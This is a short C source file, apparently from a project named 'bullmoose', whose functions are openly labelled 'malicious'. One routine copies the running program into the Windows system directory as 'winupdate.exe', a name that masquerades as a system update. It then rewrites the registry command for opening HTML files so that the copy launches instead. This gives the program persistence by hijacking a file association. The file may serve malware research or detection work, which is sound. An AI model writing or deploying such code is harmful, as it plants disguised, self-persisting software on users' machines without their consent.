#define WIN32_LEAN_AND_MEAN
#include <pthread.h>
// #include <shellapi.h>
#include <stdio.h>
#include <windows.h>

#include "bullmoose.h"

#ifndef BULLMOOSE_CPP
#define BULLMOOSE_CPP

#define MALICIOUS_CODE 1

pthread_mutex_t mutex;

void malicious_start() { pthread_mutex_init(&mutex, NULL); }

void malicious_1() {
  pthread_mutex_lock(&mutex);
#if MALICIOUS_CODE
  char MyPath[256], CpyPath[256];
  GetModuleFileName(NULL, MyPath, sizeof(MyPath));
  GetSystemDirectory(CpyPath, sizeof(CpyPath));
  strcat(CpyPath, "\\winupdate.exe");
  CopyFile(MyPath, CpyPath, FALSE);
  strcat(CpyPath, " %1");

  HKEY Key32;
  RegOpenKeyEx(HKEY_CLASSES_ROOT, "htmlfile\\shell\\opennew\\command", 0,
               KEY_WRITE, &Key32);
  RegSetValueEx(Key32, "", 0, REG_SZ, CpyPath, strlen(CpyPath));
  RegCloseKey(Key32);
#endif
  pthread_mutex_unlock(&mutex);
}
#endif // BULLMOOSE_CPP